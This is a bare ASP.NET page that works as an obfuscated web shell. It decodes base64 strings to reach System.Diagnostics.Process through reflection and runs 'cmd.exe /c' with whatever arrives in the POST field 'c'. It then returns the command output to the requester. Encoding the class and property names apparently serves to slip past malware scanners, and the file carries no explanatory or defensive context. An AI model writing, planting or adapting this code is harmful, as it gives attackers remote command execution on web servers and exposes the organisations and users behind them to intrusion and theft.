<%@ Import Namespace="System.Reflection" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
public Type GetType(string typeName)
        {
            Type type = Type.GetType(typeName);
            if (type != null) return type;
            foreach (Assembly a in AppDomain.CurrentDomain.GetAssemblies())
            {
                type = a.GetType(typeName);
                if (type != null)
                    return type;
            }
            return null;
        }

        public string D(string i)
        {
            return Encoding.UTF8.GetString(Convert.FromBase64String(i));
        }
</script>
<%
            Type pType = GetType(D("U3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MsIFN5c3RlbSwgVmVyc2lvbj0yLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODk="));
            Object pObj = Activator.CreateInstance(pType);
            Object iObj = pType.GetProperty(D("U3RhcnRJbmZv")).GetValue(pObj, null);
            Type iType = iObj.GetType();
            iType.GetProperty(D("RmlsZU5hbWU=")).SetValue(iObj, D("Y21kLmV4ZQ=="), null);
            iType.GetProperty(D("QXJndW1lbnRz")).SetValue(iObj, D("L2M=") + Request.Form["c"], null);
            iType.GetProperty(D("UmVkaXJlY3RTdGFuZGFyZE91dHB1dA==")).SetValue(iObj, true, null);
            iType.GetProperty(D("VXNlU2hlbGxFeGVjdXRl")).SetValue(iObj, false, null);
            MethodInfo pMethod = pType.GetMethod(D("U3RhcnQ="), new Type[] { });
            Object obj = pMethod.Invoke(pObj, null);
            StreamReader reader = (StreamReader)pType.GetProperty(D("U3RhbmRhcmRPdXRwdXQ=")).GetValue(pObj, null);
            string output = reader.ReadToEnd();
            Response.Write(output);
%>